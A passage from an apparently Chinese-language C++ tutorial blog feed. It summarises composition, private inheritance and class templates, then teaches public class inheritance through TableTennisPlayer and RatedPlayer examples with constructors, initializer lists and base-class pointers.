是代码重用的常用且推荐的方式，特别是当成员对象能自我管理资源时（遵循零法则）。</li><li>  包含类的构造函数使用成员初始化列表来初始化成员对象。</li><li>  例如，<code>Student</code> 类包含 <code>std::string</code> 和 <code>std::valarray&lt;double&gt;</code> 成员。</li></ul></li><li><p><strong>私有继承 (<code>private</code>):</strong></p><ul><li>  模拟 <strong>“is-implemented-in-terms-of”</strong> 关系，继承实现但不继承接口。</li><li>  基类的公有和保护成员在派生类中变为私有。</li><li>  通常不如包含直观和灵活，但可用于访问基类的保护成员或覆盖虚函数（虽然访问权限变为私有）。</li><li>  派生类需要提供自己的接口来暴露所需功能，内部访问基类成员通常需要类型转换。</li></ul></li><li><p><strong>保护继承 (<code>protected</code>):</strong></p><ul><li>  基类的公有和保护成员在派生类中变为保护。</li><li>  与私有继承类似，继承实现但不继承接口。</li><li>  允许后续的派生类访问继承来的（现在是保护的）成员。</li><li>  使用场景非常有限。</li></ul></li><li><p> <strong>包含 vs. 私有继承:</strong> 对于 “has-a” 关系，**优先选择包含 (组合)**，因为它更简单、清晰、灵活。</p></li><li><p> <strong><code>using</code> 声明与继承:</strong> 在私有或保护继承下，可以使用 <code>using Base::member;</code> 在派生类中恢复基类某个成员的可访问性（通常提升到 <code>public</code> 或 <code>protected</code>）。</p></li><li><p><strong>多重继承 (MI):</strong></p><ul><li>  允许一个类从多个基类继承。</li><li>  可能导致<strong>歧义</strong>（成员名冲突）和<strong>钻石问题</strong>（共同基类的多副本）。</li><li>  名称冲突通过作用域解析运算符 (<code>::</code>) 解决。</li><li>  钻石问题通过<strong>虚基类 (<code>virtual public Base</code>)</strong> 解决，确保共享基类的单一副本，但构造函数实现更复杂。</li><li>  应谨慎使用，优先考虑组合或单继承。</li></ul></li><li><p><strong>类模板:</strong></p><ul><li>  允许创建参数化的类蓝图，用于生成处理不同类型的类。</li><li>  使用 <code>template &lt;typename T, ...&gt;</code> 定义。</li><li>  通过提供具体类型来<strong>实例化</strong>模板类，如 <code>Stack&lt;int&gt;</code>。</li><li>  模板实现通常放在头文件中。</li><li>  可以有<strong>非类型参数</strong>（如 <code>template &lt;typename T, int N&gt;</code>），用于在编译时确定常量值（如数组大小）。</li><li>  <strong>模板具体化</strong>（显式和部分）允许为特定类型提供专门的实现。</li><li>  类可以包含<strong>成员模板</strong>（模板化的成员函数或嵌套类）。</li><li>  模板可以作为其他模板的参数（<strong>模板模板参数</strong>）。</li><li>  模板可以与<strong>友元</strong>结合，有约束和非约束两种形式。</li><li>  C++11 引入了**模板别名 (<code>using Alias = ...</code>)**，简化复杂模板类型的使用。</li></ul></li></ol><p>本章介绍的技术极大地扩展了 C++ 代码重用的可能性，从简单的对象组合到复杂的继承层次结构和强大的泛型编程工具——类模板。理解这些技术及其适用场景对于设计灵活、可维护和可重用的 C++ 代码至关重要。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 13 类继承</title>
      <link href="2025/04/30/Cpp_tutorial_Chapter_13/"/>
      <url>2025/04/30/Cpp_tutorial_Chapter_13/</url>
      
        <content type="html"><![CDATA[<h2 id="13-1-一个简单的基类"><a href="#13-1-一个简单的基类" class="headerlink" title="13.1 一个简单的基类"></a>13.1 一个简单的基类</h2><p>面向对象编程 (OOP) 的一个核心优势是<strong>代码重用</strong>。除了通过包含对象成员（组合）之外，C++ 还提供了另一种强大的代码重用机制：**继承 (Inheritance)**。</p><p>继承允许我们基于一个已有的类（称为<strong>基类 (Base Class)</strong> 或<strong>父类 (Parent Class)**）来创建一个新的类（称为</strong>派生类 (Derived Class)** 或**子类 (Child Class)**）。派生类会自动获得基类的所有成员（数据和函数），并且可以添加自己的新成员或修改继承来的成员的行为。</p><p>这种机制非常适合用来表示现实世界中的“is-a”（是一种）关系。例如，一个“经理”<strong>是</strong>一个“员工”，一个“圆”<strong>是</strong>一个“形状”。</p><p>本节我们将从定义一个简单的基类开始，然后演示如何从中派生出新的类。</p><p><strong>场景:</strong> 假设我们要为一个乒乓球俱乐部编写程序，需要表示球员信息。</p><p><strong>基类 <code>TableTennisPlayer</code>:</strong></p><p>我们首先创建一个基础的 <code>TableTennisPlayer</code> 类，包含球员的姓名和是否有球桌。</p><p><strong>tabtenn0.h (基类定义)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> TABTENN0_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABTENN0_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 简单的基类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TableTennisPlayer</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> firstname;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> lastname;</span><br><span class="line">    <span class="keyword">bool</span> hasTable;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    TableTennisPlayer (<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn = <span class="string">&quot;none&quot;</span>,</span><br><span class="line">                       <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln = <span class="string">&quot;none&quot;</span>,</span><br><span class="line">                       <span class="keyword">bool</span> ht = <span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// 方法</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Name</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// 显示姓名</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">HasTable</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> hasTable; &#125;; <span class="comment">// 是否有球桌</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ResetTable</span><span class="params">(<span class="keyword">bool</span> v)</span> </span>&#123; hasTable = v; &#125;; <span class="comment">// 重置球桌状态</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// TABTENN0_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>tabtenn0.cpp (基类实现)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;tabtenn0.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">TableTennisPlayer::TableTennisPlayer (<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn,</span><br><span class="line">                                      <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln, <span class="keyword">bool</span> ht)</span><br><span class="line">                                      : firstname(fn), lastname(ln), hasTable(ht) &#123;&#125; <span class="comment">// 使用成员初始化列表</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TableTennisPlayer::Name</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; lastname &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; firstname;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个基类很简单，包含了球员的基本信息和操作。</p><h3 id="13-1-1-派生一个类"><a href="#13-1-1-派生一个类" class="headerlink" title="13.1.1 派生一个类"></a>13.1.1 派生一个类</h3><p>现在，假设我们想为一部分球员添加“积分”信息。我们可以从 <code>TableTennisPlayer</code> 派生出一个新的类 <code>RatedPlayer</code>，它将继承 <code>TableTennisPlayer</code> 的所有成员，并添加自己的积分成员和相关方法。</p><p><strong>继承语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DerivedClassName</span> :</span> accessSpecifier BaseClassName &#123;</span><br><span class="line">    <span class="comment">// ... 派生类新增的成员 ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>  <code>DerivedClassName</code>: 派生类的名称。</li><li>  <code>:</code>: 表示继承关系。</li><li>  <code>accessSpecifier</code>: 访问说明符（通常是 <code>public</code>），指定继承类型。</li><li>  <code>BaseClassName</code>: 基类的名称。</li></ul><p><strong><code>RatedPlayer</code> 类的定义 (添加到 tabtenn0.h 或新的头文件)</strong></p><p>我们将 <code>RatedPlayer</code> 的定义也放在 <code>tabtenn0.h</code> 中（虽然分成不同文件更好）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ... (TableTennisPlayer 定义之后) ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 简单的派生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RatedPlayer</span> :</span> <span class="keyword">public</span> TableTennisPlayer &#123; <span class="comment">// 使用 public 继承</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> rating; <span class="comment">// 新增成员：积分</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 派生类构造函数</span></span><br><span class="line">    RatedPlayer (<span class="keyword">unsigned</span> <span class="keyword">int</span> r = <span class="number">0</span>, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn = <span class="string">&quot;none&quot;</span>,</span><br><span class="line">                 <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln = <span class="string">&quot;none&quot;</span>, <span class="keyword">bool</span> ht = <span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// 使用基类对象进行构造</span></span><br><span class="line">    RatedPlayer(<span class="keyword">unsigned</span> <span class="keyword">int</span> r, <span class="keyword">const</span> TableTennisPlayer &amp; tp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新增方法</span></span><br><span class="line">    <span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">Rating</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> rating; &#125; <span class="comment">// 获取积分</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ResetRating</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> r)</span> </span>&#123; rating = r; &#125; <span class="comment">// 重置积分</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... (endif) ...</span></span><br></pre></td></tr></table></figure><ul><li>  <code>class RatedPlayer : public TableTennisPlayer</code>: 这声明了 <code>RatedPlayer</code> 是一个从 <code>TableTennisPlayer</code> <strong>公有继承 (publicly derived)</strong> 而来的类。</li><li>  <strong>公有继承 (<code>public</code>)</strong>: 这是最常用的继承方式。它建立了一种 “is-a” 关系。基类的公有成员在派生类中仍然是公有的，基类的保护成员在派生类中仍然是保护的。基类的私有成员虽然被继承下来了，但在派生类中是<strong>不可直接访问</strong>的。</li><li>  <code>RatedPlayer</code> 自动拥有了 <code>firstname</code>, <code>lastname</code>, <code>hasTable</code> 数据成员以及 <code>Name()</code>, <code>HasTable()</code>, <code>ResetTable()</code> 方法（尽管私有成员不能直接访问）。</li><li>  <code>RatedPlayer</code> 添加了自己的私有成员 <code>rating</code> 和公有方法 <code>Rating()</code>, <code>ResetRating()</code>。</li></ul><h3 id="13-1-2-构造函数：访问权限的考虑"><a href="#13-1-2-构造函数：访问权限的考虑" class="headerlink" title="13.1.2 构造函数：访问权限的考虑"></a>13.1.2 构造函数：访问权限的考虑</h3><p>派生类<strong>不能</strong>直接访问基类的<strong>私有成员</strong>。那么，派生类的构造函数如何初始化继承来的基类私有成员（如 <code>firstname</code>, <code>lastname</code>）呢？</p><p>答案是：派生类构造函数必须调用<strong>基类的构造函数</strong>来完成基类部分的初始化。这是通过<strong>成员初始化列表 (Member Initializer List)</strong> 实现的。</p><p><strong>派生类构造函数的实现 (添加到 tabtenn0.cpp)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ... (TableTennisPlayer 实现之后) ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RatedPlayer 构造函数实现</span></span><br><span class="line">RatedPlayer::RatedPlayer(<span class="keyword">unsigned</span> <span class="keyword">int</span> r, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn,</span><br><span class="line">                         <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln, <span class="keyword">bool</span> ht)</span><br><span class="line">                         : TableTennisPlayer(fn, ln, ht), rating(r) &#123; <span class="comment">// 调用基类构造函数</span></span><br><span class="line">    <span class="comment">// rating(r) 初始化派生类自己的成员</span></span><br><span class="line">    <span class="comment">// 基类部分的初始化委托给 TableTennisPlayer 的构造函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RatedPlayer::RatedPlayer(<span class="keyword">unsigned</span> <span class="keyword">int</span> r, <span class="keyword">const</span> TableTennisPlayer &amp; tp)</span><br><span class="line">                         : TableTennisPlayer(tp), rating(r) &#123; <span class="comment">// 调用基类的复制构造函数 (这里是隐式生成的)</span></span><br><span class="line">    <span class="comment">// rating(r) 初始化派生类自己的成员</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>: TableTennisPlayer(fn, ln, ht)</code>: 这部分是成员初始化列表的关键。它显式地调用了基类 <code>TableTennisPlayer</code> 的构造函数，并将必要的参数 (<code>fn</code>, <code>ln</code>, <code>ht</code>) 传递给它。基类构造函数负责初始化 <code>firstname</code>, <code>lastname</code>, <code>hasTable</code>。</li><li>  <code>, rating(r)</code>: 初始化列表也用于初始化派生类自己的成员 <code>rating</code>。</li><li>  <strong>规则:</strong> 在创建派生类对象时，程序会<strong>首先</strong>调用基类的构造函数来创建和初始化对象的基类部分，<strong>然后</strong>再执行派生类构造函数体（并初始化派生类成员）。如果你不在成员初始化列表中显式调用基类构造函数，编译器会尝试调用基类的<strong>默认构造函数</strong>。如果基类没有默认构造函数，或者你需要调用带参数的基类构造函数，就必须在初始化列表中显式调用。</li></ul><h3 id="13-1-3-使用派生类"><a href="#13-1-3-使用派生类" class="headerlink" title="13.1.3 使用派生类"></a>13.1.3 使用派生类</h3><p>派生类的对象拥有基类和派生类的所有公有成员。</p><p><strong>usett0.cpp (使用示例)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\usett0.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;tabtenn0.h&quot;</span> <span class="comment">// 包含基类和派生类定义</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">( <span class="keyword">void</span> )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="function">TableTennisPlayer <span class="title">player1</span><span class="params">(<span class="string">&quot;Chuck&quot;</span>, <span class="string">&quot;Blizzard&quot;</span>, <span class="literal">true</span>)</span></span>;</span><br><span class="line">    <span class="function">RatedPlayer <span class="title">rplayer1</span><span class="params">(<span class="number">1140</span>, <span class="string">&quot;Mallory&quot;</span>, <span class="string">&quot;Duck&quot;</span>, <span class="literal">true</span>)</span></span>; <span class="comment">// 使用派生类构造函数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 派生类对象可以使用基类的方法</span></span><br><span class="line">    rplayer1.Name(); <span class="comment">// 调用继承来的 TableTennisPlayer::Name()</span></span><br><span class="line">    <span class="keyword">if</span> (rplayer1.HasTable()) <span class="comment">// 调用继承来的 TableTennisPlayer::HasTable()</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;: has a table.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;: hasn&#x27;t a table.\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 派生类对象可以使用自己的方法</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span>;</span><br><span class="line">    rplayer1.Name();</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;; Rating: &quot;</span> &lt;&lt; rplayer1.Rating() &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 调用 RatedPlayer::Rating()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以使用基类对象初始化派生类对象 (通过特定构造函数)</span></span><br><span class="line">    <span class="function">RatedPlayer <span class="title">rplayer2</span><span class="params">(<span class="number">1212</span>, player1)</span></span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span>;</span><br><span class="line">    rplayer2.Name();</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;; Rating: &quot;</span> &lt;&lt; rplayer2.Rating() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译和运行:</strong></p><p>你需要将 <code>tabtenn0.cpp</code> 和 <code>usett0.cpp</code> 一起编译链接。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ usett0.cpp tabtenn0.cpp -o usett0</span><br><span class="line">./usett0</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Duck, Mallory: has a table.</span><br><span class="line">Name: Duck, Mallory; Rating: 1140</span><br><span class="line">Name: Blizzard, Chuck; Rating: 1212</span><br></pre></td></tr></table></figure><h3 id="13-1-4-派生类和基类之间的特殊关系"><a href="#13-1-4-派生类和基类之间的特殊关系" class="headerlink" title="13.1.4 派生类和基类之间的特殊关系"></a>13.1.4 派生类和基类之间的特殊关系</h3><p>公有继承建立了一种非常重要的关系：</p><ol><li><p> <strong>派生类对象也是一个基类对象:</strong> 一个 <code>RatedPlayer</code> 对象<strong>是</strong>一个 <code>TableTennisPlayer</code> 对象。这意味着需要 <code>TableTennisPlayer</code> 对象的地方，通常可以使用 <code>RatedPlayer</code> 对象来替代。</p></li><li><p><strong>基类指针/引用可以指向/引用派生类对象:</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">RatedPlayer <span class="title">rplayer1</span><span class="params">(<span class="number">1140</span>, <span class="string">&quot;Mallory&quot;</span>, <span class="string">&quot;Duck&quot;</span>, <span class="literal">true</span>)</span></span>;</span><br><span class="line">TableTennisPlayer * pt = &amp;rplayer1; <span class="comment">// 基类指针指向派生类对象 (OK)</span></span><br><span class="line">TableTennisPlayer &amp; rt = rplayer1; <span class="comment">// 基类引用引用派生类对象 (OK)</span></span><br><span class="line"></span><br><span class="line">pt-&gt;Name(); <span class="comment">// 通过基类指针调用基类方法 (OK)</span></span><br><span class="line">rt.Name(); <span class="comment">// 通过基类引用调用基类方法 (OK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 但是，通过基类指针/引用不能直接调用派生类特有的方法</span></span><br><span class="line"><span class="comment">// pt-&gt;Rating(); // 错误！TableTennisPlayer 没有 Rating() 方法</span></span><br><span class="line"><span class="comment">// rt.Rating(); // 错误！</span></span><br></pre></td></tr></table></figure><p> 这种指针/引用的兼容性是实现<strong>多态 (Polymorphism)</strong> 的基础，我们将在后续章节详细讨论。</p></li></ol><p><strong>总结:</strong></p><ul><li>  继承允许基于现有类（基类）创建新类（派生类）。</li><li>  派生类继承基类的成员（数据和方法）。</li><li>  <strong>公有继承 (<code>public</code>)</strong> 建立 “is-a” 关系，基类的公有成员在派生类中仍是公有。</li><li>  派生类构造函数必须通过<strong>成员初始化列表</strong>调用适当的基类构造函数来初始化继承的基类成员。</li><li>  派生类对象可以使用基类的公有方法。</li><li>  基类指针或引用可以指向或引用派生类对象，但只能通过它们调用基类中定义的方法（除非使用虚函数和动态联编）。</li></ul><h2 id="13-2-继承：is-a-关系"><a href="#13-2-继承：is-a-关系" class="headerlink" title="13.2 继承：is-a 关系"></a>13.2 继承：is-a 关系</h2><p>我们在上一节看到了如何从一个基类派生出新类。其中，<strong>公有继承 (<code>public</code>)</strong> 是最常用的一种继承方式，它建立了一种被称为 <strong>“is-a”</strong> （或 “is-a-kind-of”）的关系模型。</p><p><strong>什么是 “is-a” 关系？</strong></p><p>“is-a” 关系意味着派生类的对象本质上也是基类的一种。换句话说，派生类是基类的一个<strong>特殊化</strong>版本。</p><ul><li>  在我们的例子中，<code>RatedPlayer</code> <strong>是</strong>一个 <code>TableTennisPlayer</code>。一个有积分的球员首先是一个乒乓球球员，只是他还额外具有积分属性。</li><li>  类似地，如果有一个 <code>Employee</code> 类和一个 <code>Manager</code> 类，并且 <code>Manager</code> 公有继承自 <code>Employee</code>，那么一个 <code>Manager</code> <strong>是</strong>一个 <code>Employee</code>。经理是员工的一种特殊类型，具有额外的职责或属性。</li><li>  一个 <code>Circle</code> <strong>是</strong>一个 <code>Shape</code>。</li><li>  一个 <code>Dog</code> <strong>是</strong>一个 <code>Animal</code>。</li></ul><p><strong>公有继承如何体现 “is-a”？</strong></p><p>公有继承之所以能模拟 “is-a” 关系，关键在于它保证了派生类对象拥有基类的<strong>所有公有接口</strong>。</p><ul><li>  当 <code>RatedPlayer</code> 公有继承 <code>TableTennisPlayer</code> 时，<code>TableTennisPlayer</code> 的所有 <code>public</code> 成员（如 <code>Name()</code>, <code>HasTable()</code>, <code>ResetTable()</code>）在 <code>RatedPlayer</code> 中也保持 <code>public</code>。</li><li>  这意味着任何可以对 <code>TableTennisPlayer</code> 对象执行的操作（通过其公有接口），同样也可以对 <code>RatedPlayer</code> 对象执行。一个 <code>RatedPlayer</code> 对象可以像 <code>TableTennisPlayer</code> 对象一样被使用，因为它具备了 <code>TableTennisPlayer</code> 的所有基本功能。</li></ul><p><strong>代码体现:</strong></p><p>这种关系最直接的体现就是基类指针或引用可以指向或引用派生类对象：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">RatedPlayer <span class="title">rp</span><span class="params">(<span class="string">&quot;May&quot;</span>, <span class="string">&quot;Lee&quot;</span>, <span class="literal">true</span>, <span class="number">1500</span>)</span></span>;</span><br><span class="line"><span class="function">TableTennisPlayer <span class="title">ttp</span><span class="params">(<span class="string">&quot;John&quot;</span>, <span class="string">&quot;Doe&quot;</span>, <span class="literal">false</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &quot;is-a&quot; 关系允许这种赋值/初始化</span></span><br><span class="line">TableTennisPlayer &amp; rt = rp; <span class="comment">// 基类引用可以引用派生类对象</span></span><br><span class="line">TableTennisPlayer * pt = &amp;rp; <span class="comment">// 基类指针可以指向派生类对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以通过基类引用/指针调用基类的方法</span></span><br><span class="line">rt.Name(); <span class="comment">// 输出 Lee, May</span></span><br><span class="line">pt-&gt;Name(); <span class="comment">// 输出 Lee, May</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 但不能直接通过基类引用/指针调用派生类特有的方法</span></span><br><span class="line"><span class="comment">// rt.Rating(); // 错误! TableTennisPlayer 没有 Rating() 方法</span></span><br><span class="line"><span class="comment">// pt-&gt;Rating(); // 错误!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以将派生类对象传递给需要基类对象的函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showPlayerName</span><span class="params">(<span class="keyword">const</span> TableTennisPlayer &amp; player)</span> </span>&#123;</span><br><span class="line">    player.Name();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">showPlayerName(ttp); <span class="comment">// 传递基类对象 (OK)</span></span><br><span class="line">showPlayerName(rp);  <span class="comment">// 传递派生类对象 (OK, 因为 RatedPlayer is-a TableTennisPlayer)</span></span><br></pre></td></tr></table></figure><p><strong>与其他关系的对比:</strong></p><p>继承（特别是公有继承）与其他类之间的关系不同：</p><ul><li><p><strong>“has-a” 关系 (包含/组合 - Composition):</strong> 一个类包含另一个类的对象作为其成员。例如，一个 <code>Car</code> <strong>有一个</strong> <code>Engine</code>。这通常通过将 <code>Engine</code> 对象作为 <code>Car</code> 类的数据成员来实现。<code>Car</code> 不是 <code>Engine</code>，<code>Engine</code> 也不是 <code>Car</code>。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Engine</span> &#123;</span> <span class="comment">/* ... */</span> &#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Engine engine_member; <span class="comment">// Car has-a Engine</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p><strong>“uses-a” 关系 (使用 - Association/Dependency):</strong> 一个类在它的方法中使用了另一个类的对象（例如，作为参数、返回值或局部变量），但并不拥有它。例如，一个 <code>Programmer</code> <strong>使用一个</strong> <code>Computer</code>。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Computer</span> &#123;</span> <span class="comment">/* ... */</span> &#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> 